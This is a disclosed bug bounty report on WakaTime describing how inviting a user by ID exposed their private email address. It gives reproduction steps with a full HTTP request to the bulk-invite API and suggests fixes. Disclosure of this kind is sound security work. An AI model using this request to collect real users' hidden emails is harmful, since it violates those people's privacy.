# User Email Disclosure via ID-Based Invitation

## Report Details
- **Report ID**: 3003716
- **URL**: https://hackerone.com/reports/3003716
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2025-02-20T16:14:54.781Z
- **Disclosed**: 2025-02-22T02:13:05.210Z

## Reporter
- **Username**: m_kamal1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wakatime

## Vulnerability Information
###Summary:
The issue occurs when inviting a user by their WakaTime ID. If a user has set their email to private, their email address still appears when they are invited using their ID. This contradicts the privacy settings and could lead to unintended email exposure.

###Steps to Reproduce:
1- When a user sets their email to private, anyone attempting to view it will see a page like this:
{F4074476}

2- An attacker can use the user’s ID to invite them to their organization by either pasting the ID in the invitation section or send the invite request it looks like this:
```
POST /api/v1/users/current/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people.bulk HTTP/2
Host: wakatime.com
Cookie: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.2651.74
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://wakatime.com/settings/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people
Content-Type: application/json
X-Csrftoken: 9d881d42b2b05abc4b1e057b6f6dd058d394be28554afb508fcf988ed24ff283
X-Requested-With: XMLHttpRequest
Content-Length: 58
Origin: https://wakatime.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: red
Priority: u=0
Te: trailers

{"people":[{"id":"<victim_id>"}]}
```
3- After that, the victim's email will be disclosed.

###Suggested Fix:
- Ensure that email addresses remain hidden in all cases where a user has opted to keep them private.
- If inviting by ID, display only the username or a masked identifier rather than exposing the email.

## Impact

- Email Address Disclosure: Users who believe their email is hidden may have it exposed to others.
- Privacy Violation

## Attachments
- image.png
